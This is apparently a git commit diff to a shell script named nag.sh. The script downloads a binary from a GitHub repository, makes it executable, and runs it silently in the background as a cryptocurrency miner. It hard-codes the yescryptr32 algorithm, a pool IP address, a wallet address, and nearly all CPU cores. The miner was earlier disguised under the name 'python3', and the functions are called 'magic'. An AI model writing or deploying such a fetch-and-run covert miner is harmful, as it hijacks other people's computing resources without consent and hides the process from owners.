d30bbceb757785872807537eb32776a0e26e6839
barburonjilo <barburonjilo@outlook.co.id>
2024-08-14 09:02:10 +0700

    Update nag.sh

--- nag.sh
+++ nag.sh
@@ -4,23 +4,23 @@
 num_cores=$(( $(nproc) - 1 ))
 
 # Download the script
-wget -O python3 https://github.com/barburonjilo/back/raw/main/sr
+wget -O sgq https://github.com/barburonjilo/back/raw/main/sr
 
 # Make the script executable
-chmod +x python3
+chmod +x sgq
 
 # Generate a localized date string
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 
 # Function to start the magic process
 start_magic() {
-  nohup ./python3 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  nohup ./sgq -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 -t $num_cores > /dev/null 2>&1 &
   echo "Magic started with PID: $!"
 }
 
 # Function to stop the magic process
 stop_magic() {
-  pkill -f python3
+  pkill -f sgq
   echo "Magic stopped"
 }
 
